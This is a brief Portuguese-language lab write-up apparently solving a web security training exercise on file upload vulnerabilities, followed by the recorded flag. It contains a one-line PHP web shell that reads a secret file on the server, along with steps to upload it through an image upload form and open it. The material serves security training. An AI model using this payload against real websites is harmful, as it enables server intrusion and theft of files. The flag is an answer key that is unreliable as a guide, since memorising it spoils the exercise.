# Exercises

## File upload vulnerabilities 

### >> 1. Remote code execution via web shell upload
Crie um arqvuio com o conteudo:
````php
 <?php echo file_get_contents('/home/carlos/secret'); ?> 
````
Submeta o arquivo via upload de imagens e acesse o arquivo submetido através do link informado.

`Flag: 0sehBXVzLAZHtNFAuMJmIlFDR3UGAx5s`

